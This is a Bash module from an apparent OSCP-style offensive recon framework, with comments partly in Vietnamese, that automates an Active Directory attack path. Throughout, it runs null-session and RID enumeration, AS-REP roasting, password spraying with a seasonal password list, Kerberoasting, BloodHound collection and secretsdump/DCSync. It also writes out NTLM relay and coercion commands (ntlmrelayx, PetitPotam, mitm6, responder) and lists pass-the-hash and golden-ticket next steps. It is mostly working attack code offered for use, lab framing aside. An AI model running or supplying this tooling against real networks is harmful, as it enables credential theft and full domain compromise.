#!/bin/bash
# ============================================================================
# AUTO RECON - Phase 12: Active Directory Attack Path (OSCP-oriented)
# ----------------------------------------------------------------------------
# Full AD enumeration + offensive handoff for boot2root / OSCP-style domains.
# Stages follow the standard methodology: unauth enum -> AS-REP roast ->
# authenticated enum (Kerberoast, BloodHound, secretsdump) -> ADCS -> relay
# handoff -> crack hints -> summary. Every external command is previewed (and
# collected into commands_poc.txt for the report). Noisy/risky tooling
# (responder/mitm6/relay/coercion) is command-only and gated by OffSec-safe.
# Authorized lab / exam / pentest use only.
# ============================================================================

ad_dir() { echo "${1}/ad"; }
ensure_ad_layout() { mkdir -p "$(ad_dir "$1")/loot" "$(ad_dir "$1")/bloodhound"; }

ad_attacker_ip() {
    if declare -F privesc_attacker_ip >/dev/null; then privesc_attacker_ip
    else ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1; fi
}

_ad_ask() {
    local prompt="$1" default="$2"
    local __pre; if declare -F _ar_preseed >/dev/null && __pre=$(_ar_preseed "$prompt"); then printf '%s\n' "$__pre"; return 0; fi
    if declare -F tui_input >/dev/null && tui_enabled; then
        tui_input "$prompt" "$default"
    else
        local v; echo -ne "  ${BOLD}${prompt}${default:+ [${default}]}:${NC} " >&2; read -r v
        printf '%s\n' "${v:-$default}"
    fi
}

# Run an external command: preview (-> PoC file + visible on stderr via
# log_command_preview), execute with a timeout, save output to a file AND
# stream it live to the terminal (stderr) so you always see command + output.
# run_timed already calls log_command_preview, so we don't double-preview here.
_ad_run() {
    local outfile="$1"; shift
    if [[ -n "$outfile" ]]; then
        run_timed "${TOOL_TIMEOUT:-420}" "$@" 2>&1 | tee "$outfile" >&2
        return "${PIPESTATUS[0]}"
    else
        run_timed "${TOOL_TIMEOUT:-420}" "$@" >&2 2>&1
    fi
}

# Pick the SMB/AD swiss-army tool (netexec preferred, crackmapexec fallback).
ad_smb_tool() { pick_tool nxc netexec nxc crackmapexec cme 2>/dev/null; }

# ── Detect domain / DC from prior scan output ──────────────────────────────
AD_DOMAIN=""; AD_DC_HOST=""; AD_DC_IP=""
ad_detect() {
    local ip="$1" result_dir="$2"
    local nmap_file="${result_dir}/scans/nmap_targeted.nmap"
    AD_DC_IP="$ip"; AD_DOMAIN=""; AD_DC_HOST=""
    [[ -f "$nmap_file" ]] || return 0
    # nmap ldap/smb scripts expose the domain + FQDN.
    AD_DOMAIN=$(grep -aoiE 'Domain: [A-Za-z0-9._-]+' "$nmap_file" | head -1 | awk '{print $2}' | sed 's/0\.$//;s/\.$//')
    [[ -z "$AD_DOMAIN" ]] && AD_DOMAIN=$(grep -aoiE '_domain_dns[^,]*|DNS_Domain_Name: [A-Za-z0-9._-]+' "$nmap_file" | grep -oiE '[A-Za-z0-9_-]+\.[A-Za-z0-9._-]+' | head -1)
    AD_DC_HOST=$(grep -aoiE '(DNS_Computer_Name|_hostname): ?[A-Za-z0-9._-]+' "$nmap_file" | head -1 | grep -oiE '[A-Za-z0-9._-]+$')
    [[ -z "$AD_DC_HOST" ]] && AD_DC_HOST=$(grep -aoiE 'commonName=[A-Za-z0-9._-]+' "$nmap_file" | head -1 | cut -d= -f2)
}

# Is this host an AD domain controller / member worth the AD phase?
ad_is_target() {
    local result_dir="$1"
    local ports; ports=$(cat "${result_dir}/scans/open_ports.txt" 2>/dev/null)
    [[ ",$ports," == *",88,"* ]] && return 0          # Kerberos
    [[ ",$ports," == *",389,"* || ",$ports," == *",636,"* ]] && \
        [[ ",$ports," == *",445,"* ]] && return 0     # LDAP + SMB
    return 1
}

ad_update_hosts() {
    local ip="$1"
    [[ -n "$AD_DOMAIN" ]] || return 0
    local line="${ip} ${AD_DOMAIN} ${AD_DC_HOST:+${AD_DC_HOST}.${AD_DOMAIN}} ${AD_DC_HOST}"
    if check_root; then
        if ! grep -qiE "[[:space:]]${AD_DOMAIN}([[:space:]]|$)" /etc/hosts 2>/dev/null; then
            echo "$line" >> /etc/hosts
            log_success "Added to /etc/hosts: ${line}"
        fi
    else
        log_info "Add to /etc/hosts (need root):  ${line}"
    fi
}

# ── Stage 1: unauthenticated enumeration ───────────────────────────────────
ad_null_enum() {
    local ip="$1" result_dir="$2"
    local d; d=$(ad_dir "$result_dir")
    sub_header "AD Unauthenticated Enumeration"
    local nxc; nxc=$(ad_smb_tool)

    if [[ -n "$nxc" ]]; then
        _ad_run "${d}/nxc_smb_info.txt" "$nxc" smb "$ip"                                  >/dev/null
        log_scan "Null session: users / shares / pass-pol / RID brute"
        _ad_run "${d}/nxc_users.txt"    "$nxc" smb "$ip" -u '' -p '' --users               >/dev/null
        _ad_run "${d}/nxc_rid.txt"      "$nxc" smb "$ip" -u '' -p '' --rid-brute 4000       >/dev/null
        _ad_run "${d}/nxc_shares.txt"   "$nxc" smb "$ip" -u '' -p '' --shares              >/dev/null
        _ad_run "${d}/nxc_passpol.txt"  "$nxc" smb "$ip" -u '' -p '' --pass-pol            >/dev/null
        # Guest fallback often works when null is restricted.
        _ad_run "${d}/nxc_guest_users.txt" "$nxc" smb "$ip" -u 'guest' -p '' --users        >/dev/null
    else
        log_warn "netexec/crackmapexec not installed — using rpcclient/enum4linux fallback"
    fi

    command -v enum4linux-ng &>/dev/null && _ad_run "${d}/enum4linux_ng.txt" enum4linux-ng -A "$ip" >/dev/null
    command -v enum4linux    &>/dev/null && [[ ! -s "${d}/enum4linux_ng.txt" ]] && _ad_run "${d}/enum4linux.txt" enum4linux -a "$ip" >/dev/null

    if command -v rpcclient &>/dev/null; then
        log_command_preview rpcclient -U "" -N "$ip" -c "enumdomusers"
        { echo "=== enumdomusers ==="; rpcclient -U "" -N "$ip" -c "enumdomusers" 2>/dev/null
          echo "=== querydispinfo ==="; rpcclient -U "" -N "$ip" -c "querydispinfo" 2>/dev/null
        } > "${d}/rpcclient_null.txt"
    fi

    # Anonymous LDAP dump of naming contexts (often leaks descriptions w/ creds).
    if command -v ldapsearch &>/dev/null && [[ -n "$AD_DOMAIN" ]]; then
        local base; base="dc=${AD_DOMAIN//./,dc=}"
        _ad_run "${d}/ldap_anon.txt" ldapsearch -x -H "ldap://${ip}" -b "$base" >/dev/null
    fi

    # Build a deduped userlist from everything we found.
    ad_build_userlist "$result_dir"
}

# Consolidate discovered usernames into ad/users.txt.
ad_build_userlist() {
    local result_dir="$1"; local d; d=$(ad_dir "$result_dir")
    local out="${d}/users.txt"
    {
        grep -hoiE '\\[A-Za-z0-9._-]+' "${d}/nxc_users.txt" "${d}/nxc_rid.txt" "${d}/nxc_guest_users.txt" 2>/dev/null | sed 's/.*\\//'
        grep -hoiE 'user:\[[^]]+\]' "${d}/rpcclient_null.txt" 2>/dev/null | sed -E 's/user:\[([^]]+)\]/\1/'
        awk -F: '/SidTypeUser/ {print $0}' "${d}/nxc_rid.txt" 2>/dev/null | grep -oiE '\\[A-Za-z0-9._-]+' | sed 's/.*\\//'
    } 2>/dev/null | grep -viE '^\$|^$' | sort -u > "$out"
    local n; n=$(wc -l < "$out" 2>/dev/null || echo 0)
    if (( n > 0 )); then
        log_success "Collected ${n} domain user(s) → ${out}"
        head -15 "$out" | sed 's/^/    /'
    else
        log_info "No users harvested from null/guest session"
    fi
}

# ── Stage 2: AS-REP roasting (no creds) ────────────────────────────────────
ad_asrep_roast() {
    local ip="$1" result_dir="$2"
    local d; d=$(ad_dir "$result_dir")
    command -v impacket-GetNPUsers &>/dev/null || { log_info "impacket-GetNPUsers missing — skip AS-REP"; return 0; }
    [[ -n "$AD_DOMAIN" ]] || { log_info "Domain unknown — skip AS-REP roast"; return 0; }
    sub_header "AS-REP Roasting (no credentials)"
    local users="${d}/users.txt"
    local out="${d}/asrep_hashes.txt"
    if [[ -s "$users" ]]; then
        _ad_run "${d}/asrep_run.txt" impacket-GetNPUsers "${AD_DOMAIN}/" -no-pass -usersfile "$users" -dc-ip "$ip" -format hashcat -outputfile "$out" >/dev/null
    else
        _ad_run "${d}/asrep_run.txt" impacket-GetNPUsers "${AD_DOMAIN}/" -no-pass -dc-ip "$ip" -format hashcat -outputfile "$out" >/dev/null
    fi
    if [[ -s "$out" ]]; then
        print_found "AS-REP hash(es) captured → ${out}"
        echo -e "    ${YELLOW}Crack:${NC} hashcat -m 18200 ${out} \$(rockyou)"
    else
        log_info "No AS-REP-roastable users (DONT_REQ_PREAUTH not set)"
    fi
}

# ── Stage 2.5: password spraying (lockout-aware) ───────────────────────────
# Fallback AD password wordlist (Cryilllic) — chỉ tải khi chưa có list nào khác.
AD_PASS_WORDLIST_URL="${AD_PASS_WORDLIST_URL:-https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Passwords.txt}"

# Tìm một AD password wordlist lớn hơn (optional, graceful):
#   1) bản cache local  2) seclists trên Kali  3) tải Cryilllic AD-Wordlists.
ad_resolve_pass_wordlist() {
    local cache="${BASE_DIR:-.}/wordlists/ad_passwords.txt"
    [[ -s "$cache" ]] && { echo "$cache"; return 0; }
    local p
    for p in \
        /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
        /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt; do
        [[ -s "$p" ]] && { echo "$p"; return 0; }
    done
    # Không có sẵn → thử tải Cryilllic (chỉ khi online), rồi cache lại.
    mkdir -p "$(dirname "$cache")" 2>/dev/null
    if have_tool curl; then
        log_command_preview curl -fsSL --max-time 20 "$AD_PASS_WORDLIST_URL"
        curl -fsSL --max-time 20 "$AD_PASS_WORDLIST_URL" -o "$cache" 2>/dev/null
    elif have_tool wget; then
        log_command_preview wget -qO "$cache" "$AD_PASS_WORDLIST_URL"
        wget -q --timeout=20 -O "$cache" "$AD_PASS_WORDLIST_URL" 2>/dev/null
    fi
    if [[ -s "$cache" ]]; then
        # NOTE: this function's stdout is captured (big=$(ad_resolve_pass_wordlist)),
        # so the log line MUST go to stderr or it pollutes the returned path.
        log_success "AD wordlist (Cryilllic) đã tải → ${cache}" >&2
        echo "$cache"; return 0
    fi
    rm -f "$cache" 2>/dev/null
    return 1
}

# Build the spray list: seasonal/common (luôn có, ưu tiên trước) + một phần
# của AD wordlist lớn. Cap lại để tránh lockout (đổi qua AD_SPRAY_MAX).
ad_default_passlist() {
    local d="$1"
    local out="${d}/spray_passwords.txt"
    [[ -s "$out" ]] && { echo "$out"; return 0; }
    local year prev; year=$(date +%Y); prev=$((year - 1))
    {
        cat <<EOF
Password1
Password123!
Welcome1
Welcome123!
P@ssw0rd
P@ssw0rd!
Passw0rd!
Spring${year}!
Summer${year}!
Autumn${year}!
Winter${year}!
Spring${prev}!
Winter${prev}!
Company123!
Changeme123!
EOF
        local big; big=$(ad_resolve_pass_wordlist)
        [[ -n "$big" && -s "$big" ]] && cat "$big"
    } | awk 'NF && !seen[$0]++' | head -n "${AD_SPRAY_MAX:-40}" > "$out"
    echo "$out"
}

# Phase F: parse the account-lockout threshold from a captured pass-pol file.
# Echoes an integer (0 = "none/unlimited") or nothing if it couldn't be read.
ad_passpol_lockout_threshold() {
    local f="$1"
    [[ -s "$f" ]] || return 1
    local n
    # nxc --pass-pol / rpcclient getdompwinfo / enum4linux wording all covered.
    n=$(grep -aiE 'lockout( account)? threshold|Account Lockout Threshold' "$f" 2>/dev/null | head -1 | grep -oiE '[0-9]+|none' | head -1)
    [[ -z "$n" ]] && return 1
    [[ "${n,,}" == "none" ]] && { echo 0; return 0; }
    echo "$n"; return 0
}

# Spray passwords across the harvested userlist. ONE password at a time
# (true spraying) to respect lockout policy. Captures valid creds.
ad_password_spray() {
    local ip="$1" result_dir="$2"
    local d; d=$(ad_dir "$result_dir")
    local nxc; nxc=$(ad_smb_tool)
    [[ -n "$nxc" ]] || { log_warn "netexec/crackmapexec missing — skip password spray"; return 0; }
    local users="${d}/users.txt"
    [[ -s "$users" ]] || { log_info "No users.txt yet — chạy Unauth enum (1) trước khi spray"; return 0; }

    sub_header "Password Spraying (nxc — lockout-aware)"
    log_warn "Kiểm tra lockout threshold ở ad/nxc_passpol.txt TRƯỚC khi spray (tránh khoá tài khoản!)"

    # Phase F: auto-cap attempts below the lockout threshold so we never lock accounts.
    local threshold; threshold=$(ad_passpol_lockout_threshold "${d}/nxc_passpol.txt")
    if [[ -n "$threshold" ]]; then
        if (( threshold == 0 )); then
            log_info "Lockout threshold: ${BOLD}none${NC} — spraying is safe."
        else
            # leave a 1-attempt safety margin (threshold-1), and never below 1.
            local safe_cap=$(( threshold > 1 ? threshold - 1 : 1 ))
            if (( AD_SPRAY_MAX > safe_cap )); then
                log_warn "Lockout threshold=${threshold} → capping spray at ${BOLD}${safe_cap}${NC} password(s) (was ${AD_SPRAY_MAX})."
                AD_SPRAY_MAX="$safe_cap"
            else
                log_info "Lockout threshold=${threshold}; AD_SPRAY_MAX=${AD_SPRAY_MAX} already safe."
            fi
        fi
    else
        log_warn "Lockout threshold unknown — keeping AD_SPRAY_MAX=${AD_SPRAY_MAX}. Verify manually!"
    fi

    local domflag=(); [[ -n "$AD_DOMAIN" ]] && domflag=(-d "$AD_DOMAIN")
    local hits="${d}/spray_hits.txt"; : > "$hits"
    : > "${d}/spray_run.txt"

    # 1) username == password (line-by-line, không cartesian)
    log_scan "Thử username==password"
    _ad_run "${d}/spray_useraspass.txt" "$nxc" smb "$ip" "${domflag[@]}" -u "$users" -p "$users" --no-bruteforce --continue-on-success
    grep -aE '\[\+\]' "${d}/spray_useraspass.txt" 2>/dev/null >> "$hits"

    # 2) curated/seasonal list — MỘT password / lượt (spray an toàn)
    local plist; plist=$(ad_default_passlist "$d")
    if [[ "${INTERACTIVE:-true}" == "true" ]]; then
        local extra; extra=$(_ad_ask "Wordlist password riêng (Enter = dùng list mặc định)" "")
        [[ -n "$extra" && -f "$extra" ]] && plist="$extra"
    fi
    log_scan "Spray $(wc -l < "$plist" 2>/dev/null) password qua $(wc -l < "$users" 2>/dev/null) user"
    local pw
    while IFS= read -r pw; do
        [[ -z "$pw" ]] && continue
        _ad_run "${d}/spray_tmp.txt" "$nxc" smb "$ip" "${domflag[@]}" -u "$users" -p "$pw" --continue-on-success
        grep -aE '\[\+\]' "${d}/spray_tmp.txt" 2>/dev/null >> "$hits"
        cat "${d}/spray_tmp.txt" >> "${d}/spray_run.txt" 2>/dev/null
    done < "$plist"
    rm -f "${d}/spray_tmp.txt"

    if [[ -s "$hits" ]]; then
        sort -u "$hits" -o "$hits"
        print_found "Credential HỢP LỆ từ spray → ${hits}"
        sed 's/^/    /' "$hits"
        echo -e "    ${YELLOW}Tiếp:${NC} dùng creds này ở 'Authenticated enum' (mục 3)"
    else
        log_info "Spray không ra credential nào"
    fi
}

# ── Stage 3: authenticated enumeration ─────────────────────────────────────
ad_with_creds() {
    local ip="$1" result_dir="$2"
    local d; d=$(ad_dir "$result_dir")
    local nxc; nxc=$(ad_smb_tool)
    local domain user secret authflag
    domain=$(_ad_ask "Domain" "${AD_DOMAIN}")
    user=$(_ad_ask "Username" "")
    [[ -z "$user" ]] && { log_warn "No username given"; return 1; }
    secret=$(_ad_ask "Password (leave empty to use NT hash)" "")
    if [[ -n "$secret" ]]; then authflag=(-u "$user" -p "$secret")
    else
        local nthash; nthash=$(_ad_ask "NT hash" "")
        [[ -z "$nthash" ]] && { log_warn "No password or hash"; return 1; }
        authflag=(-u "$user" -H "$nthash")
    fi
    sub_header "Authenticated AD Enumeration (${domain}/${user})"

    if [[ -n "$nxc" ]]; then
        _ad_run "${d}/auth_smb.txt"    "$nxc" smb  "$ip" -d "$domain" "${authflag[@]}"                       >/dev/null
        _ad_run "${d}/auth_shares.txt" "$nxc" smb  "$ip" -d "$domain" "${authflag[@]}" --shares              >/dev/null
        _ad_run "${d}/auth_users.txt"  "$nxc" smb  "$ip" -d "$domain" "${authflag[@]}" --users               >/dev/null
        _ad_run "${d}/auth_groups.txt" "$nxc" smb  "$ip" -d "$domain" "${authflag[@]}" --groups              >/dev/null
        _ad_run "${d}/auth_loggedon.txt" "$nxc" smb "$ip" -d "$domain" "${authflag[@]}" --loggedon-users     >/dev/null
        # Hunt readable shares for creds (GPP, configs, scripts).
        _ad_run "${d}/auth_spider.txt" "$nxc" smb "$ip" -d "$domain" "${authflag[@]}" -M spider_plus         >/dev/null
        # winrm / mssql access check (foothold candidates).
        _ad_run "${d}/auth_winrm.txt"  "$nxc" winrm "$ip" -d "$domain" "${authflag[@]}"                      >/dev/null
        if grep -qi 'Pwn3d!' "${d}/auth_smb.txt" "${d}/auth_winrm.txt" 2>/dev/null; then
            print_found "ADMIN ACCESS detected (Pwn3d!) — try evil-winrm / psexec / secretsdump"
        fi
    fi

    # Kerberoasting
    if command -v impacket-GetUserSPNs &>/dev/null; then
        local kout="${d}/kerberoast_hashes.txt"
        if [[ -n "$secret" ]]; then
            _ad_run "${d}/kerberoast_run.txt" impacket-GetUserSPNs "${domain}/${user}:${secret}" -dc-ip "$ip" -request -outputfile "$kout" >/dev/null
        else
            _ad_run "${d}/kerberoast_run.txt" impacket-GetUserSPNs "${domain}/${user}" -hashes ":$(_ad_last_hash)" -dc-ip "$ip" -request -outputfile "$kout" >/dev/null
        fi
        [[ -s "$kout" ]] && { print_found "Kerberoast hash(es) → ${kout}"; echo -e "    ${YELLOW}Crack:${NC} hashcat -m 13100 ${kout} \$(rockyou)"; }
    fi

    # BloodHound collection
    if command -v bloodhound-python &>/dev/null; then
        log_scan "BloodHound ingest (-c All)"
        ( cd "${d}/bloodhound" && \
          if [[ -n "$secret" ]]; then
              log_command_preview bloodhound-python -d "$domain" -u "$user" -p "$secret" -ns "$ip" -c All --zip
              run_timed "${TOOL_TIMEOUT:-420}" bloodhound-python -d "$domain" -u "$user" -p "$secret" -ns "$ip" -c All --zip >/dev/null 2>&1
          fi )
        local bh; bh=$(ls "${d}/bloodhound/"*.zip 2>/dev/null | head -1)
        [[ -n "$bh" ]] && log_success "BloodHound data → ${bh} (import vào BloodHound GUI)"
    fi

    # secretsdump (works fully if creds are privileged -> DCSync)
    if command -v impacket-secretsdump &>/dev/null; then
        local sd="${d}/secretsdump.txt"
        if [[ -n "$secret" ]]; then
            _ad_run "$sd" impacket-secretsdump "${domain}/${user}:${secret}@${ip}" >/dev/null
        else
            _ad_run "$sd" impacket-secretsdump -hashes ":$(_ad_last_hash)" "${domain}/${user}@${ip}" >/dev/null
        fi
        grep -qiE ':::' "$sd" 2>/dev/null && print_found "secretsdump returned hashes → ${sd} (DCSync? pass-the-hash next)"
    fi

    ad_adcs "$ip" "$result_dir" "$domain" "$user" "$secret"
}

# Helper: last NT hash the user entered (re-prompt fallback).
_ad_last_hash() { _ad_ask "NT hash (again, for impacket -hashes)" ""; }

# ── Stage 4: ADCS (certipy) ────────────────────────────────────────────────
ad_adcs() {
    local ip="$1" result_dir="$2" domain="$3" user="$4" secret="$5"
    command -v certipy &>/dev/null || command -v certipy-ad &>/dev/null || return 0
    local cert; cert=$(command -v certipy-ad || command -v certipy)
    local d; d=$(ad_dir "$result_dir")
    sub_header "ADCS Enumeration (certipy)"
    if [[ -n "$secret" ]]; then
        _ad_run "${d}/certipy_find.txt" "$cert" find -u "${user}@${domain}" -p "$secret" -dc-ip "$ip" -vulnerable -stdout >/dev/null
    else
        log_info "certipy needs a password; skipping (run manually with -hashes)"
        return 0
    fi
    grep -qiE 'ESC[0-9]|Vulnerab' "${d}/certipy_find.txt" 2>/dev/null && \
        print_found "Vulnerable ADCS template(s) found (ESC*) → ${d}/certipy_find.txt"
}

# ── Stage 5: coercion / relay handoff (command-only, gated) ────────────────
ad_relay_handoff() {
    local ip="$1" result_dir="$2"
    local d; d=$(ad_dir "$result_dir")
    if declare -F offsec_oscp_safe_mode_enabled >/dev/null && offsec_oscp_safe_mode_enabled; then
        log_info "OffSec-safe ON — skipping relay/coercion handoff (noisy/risky)"
        return 0
    fi
    local lhost; lhost=$(ad_attacker_ip)
    sub_header "NTLM Relay / Coercion Handoff (manual)"
    local nxc; nxc=$(ad_smb_tool)
    [[ -n "$nxc" ]] && _ad_run "${d}/smb_signing.txt" "$nxc" smb "$ip" --gen-relay-list "${d}/relay_targets.txt" >/dev/null
    cat > "${d}/relay_commands.txt" <<EOF
# Hosts with SMB signing disabled are in relay_targets.txt
# 1) Relay listener:
impacket-ntlmrelayx -tf ${d}/relay_targets.txt -smb2support -i
#    (add  -c 'powershell ...'  for command exec, or --escalate-user for ADCS ESC8)
# 2) Coerce auth from the DC/target to ${lhost}:
python3 PetitPotam.py ${lhost} ${ip}
python3 coercer.py coerce -t ${ip} -l ${lhost}
# 3) IPv6 / WPAD:
mitm6 -d ${AD_DOMAIN:-DOMAIN.LOCAL}
responder -I tun0
EOF
    log_success "Relay/coercion commands → ${d}/relay_commands.txt (chạy thủ công)"
}

# ── Stage 6: crack hints ───────────────────────────────────────────────────
ad_crack_hints() {
    local result_dir="$1"; local d; d=$(ad_dir "$result_dir")
    local rock="/usr/share/wordlists/rockyou.txt"
    {
        echo "=== Hash cracking commands ==="
        [[ -s "${d}/asrep_hashes.txt" ]]     && echo "hashcat -m 18200 ${d}/asrep_hashes.txt ${rock}     # AS-REP"
        [[ -s "${d}/kerberoast_hashes.txt" ]] && echo "hashcat -m 13100 ${d}/kerberoast_hashes.txt ${rock} # Kerberoast"
        echo "hashcat -m 5600  netntlmv2.txt ${rock}                 # Responder NetNTLMv2"
        echo "# John alt:  john --wordlist=${rock} <hashfile>"
    } > "${d}/crack_hints.txt"
}

# ── Summary ────────────────────────────────────────────────────────────────
ad_summary() {
    local ip="$1" result_dir="$2"; local d; d=$(ad_dir "$result_dir")
    local users_n=0; [[ -s "${d}/users.txt" ]] && users_n=$(wc -l < "${d}/users.txt")
    {
        echo "=== Active Directory Summary — ${ip} ==="
        echo "Domain:        ${AD_DOMAIN:-unknown}"
        echo "DC host:       ${AD_DC_HOST:-unknown}"
        echo "Domain users:  ${users_n}"
        echo "Spray creds:   $([[ -s "${d}/spray_hits.txt" ]] && echo "YES → ad/spray_hits.txt" || echo no)"
        echo "AS-REP hashes: $([[ -s "${d}/asrep_hashes.txt" ]] && echo yes || echo no)"
        echo "Kerberoast:    $([[ -s "${d}/kerberoast_hashes.txt" ]] && echo yes || echo no)"
        echo "ADCS vuln:     $(grep -qiE 'ESC[0-9]' "${d}/certipy_find.txt" 2>/dev/null && echo yes || echo 'no/unknown')"
        echo "Admin (Pwn3d): $(grep -qi 'Pwn3d!' "${d}"/auth_*.txt 2>/dev/null && echo yes || echo 'no/unknown')"
        # Phase F: BloodHound shortest-path hint driven by what we actually collected.
        local bh_zip; bh_zip=$(ls "${d}/bloodhound/"*.zip "${d}/bloodhound/"*.json 2>/dev/null | head -1)
        if [[ -n "$bh_zip" ]]; then
            echo "BloodHound:    data present → ${bh_zip#${result_dir}/}"
            echo "  ↳ upload it, mark owned users, run pre-built query 'Shortest Path to Domain Admins'"
            echo "  ↳ also check: 'Shortest Paths to Unconstrained Delegation' & Kerberoastable→DA"
        else
            echo "BloodHound:    none yet → collect with:  bloodhound-python -d ${AD_DOMAIN:-DOMAIN} -u USER -p PASS -ns ${ip} -c All"
        fi
        echo ""
        echo "Next steps:"
        echo "  - crack hashes (see crack_hints.txt) -> reuse creds (spray with nxc)"
        echo "  - foothold:  evil-winrm -i ${ip} -u USER -p PASS   (or -H NTHASH)"
        echo "  - pass-the-hash: impacket-psexec/wmiexec  DOMAIN/USER@${ip} -hashes :NTHASH"
        echo "  - privileged: impacket-secretsdump (DCSync) -> golden ticket"
        echo "  - BloodHound: import bloodhound/*.zip, find shortest path to DA"
    } > "${d}/summary.txt"
    log_success "AD summary → ${d}/summary.txt"
    echo ""; sed 's/^/  /' "${d}/summary.txt"
}

# ── Orchestrator ───────────────────────────────────────────────────────────
# Auto (non-interactive, e.g. full-auto): detect + null enum + AS-REP + summary.
# Interactive: TUI/text sub-menu for the credentialed stages.
run_ad_enum() {
    local ip="$1" result_dir="$2"
    section_header "PHASE 12: ACTIVE DIRECTORY ATTACK PATH" "$ICON_FOUND"
    ensure_ad_layout "$result_dir"
    ad_detect "$ip" "$result_dir"
    log_info "Domain: ${BOLD}${AD_DOMAIN:-unknown}${NC}  DC: ${BOLD}${AD_DC_HOST:-?}${NC}  IP: ${ip}"
    ad_update_hosts "$ip"

    if [[ "${INTERACTIVE:-true}" != "true" ]]; then
        ad_null_enum "$ip" "$result_dir"
        # Auto password spraying can trip account-lockout policies. Skip it in
        # OSCP-safe mode (same contract that gates sqlmap/nuclei/dalfox); it
        # stays available on-demand via the AD menu [8].
        if [[ "${OFFSEC_OSCP_SAFE_MODE:-false}" == "true" ]]; then
            log_info "OSCP-safe: skip auto password spray (lockout risk) — run AD menu [8] manually if wanted"
        else
            ad_password_spray "$ip" "$result_dir"
        fi
        ad_asrep_roast "$ip" "$result_dir"
        ad_crack_hints "$result_dir"
        ad_summary "$ip" "$result_dir"
        return 0
    fi

    while true; do
        local choice
        if declare -F tui_choose >/dev/null && tui_enabled; then
            declare -F tui_screen_enter >/dev/null && tui_screen_enter
            tui_header "🏰 Active Directory — ${AD_DOMAIN:-?}" "DC ${ip}  ·  LHOST $(ad_attacker_ip)" >&2
            local sel
            sel=$(tui_choose "Chọn bước" \
                "1  👻 Unauth enum (null/guest/RID/LDAP)" \
                "2  🔥 AS-REP roast (no creds)" \
                "8  💦 Password spray (dùng users.txt)" \
                "3  🔑 Authenticated enum (creds/hash)" \
                "4  📜 ADCS (certipy)" \
                "5  📡 Relay/Coercion handoff" \
                "6  🧮 Crack hints" \
                "7  📋 Summary" \
                "0  ← Back")
            declare -F tui_screen_leave >/dev/null && tui_screen_leave
            choice="${sel%%[[:space:]]*}"
        else
            sub_header "AD Attack Path"
            echo -e "  [1] Unauth enum  [2] AS-REP roast  [8] Password spray  [3] Auth enum"
            echo -e "  [4] ADCS  [5] Relay handoff  [6] Crack hints  [7] Summary  [0] Back"
            echo -ne "  ${BOLD}Choose:${NC} "; read -r choice
        fi
        case "$choice" in
            1) ad_null_enum "$ip" "$result_dir" ;;
            2) ad_asrep_roast "$ip" "$result_dir" ;;
            8) ad_password_spray "$ip" "$result_dir" ;;
            3) ad_with_creds "$ip" "$result_dir" ;;
            4) ad_with_creds "$ip" "$result_dir" ;;   # ADCS prompts within
            5) ad_relay_handoff "$ip" "$result_dir" ;;
            6) ad_crack_hints "$result_dir"; cat "$(ad_dir "$result_dir")/crack_hints.txt" 2>/dev/null | sed 's/^/    /' ;;
            7) ad_summary "$ip" "$result_dir" ;;
            0|"") return 0 ;;
            *) log_warn "Unknown: $choice"; sleep 1 ;;
        esac
        [[ "$choice" =~ ^[1-8]$ ]] && { echo -e "  ${YELLOW}Press Enter...${NC}"; read -r; }
    done
}
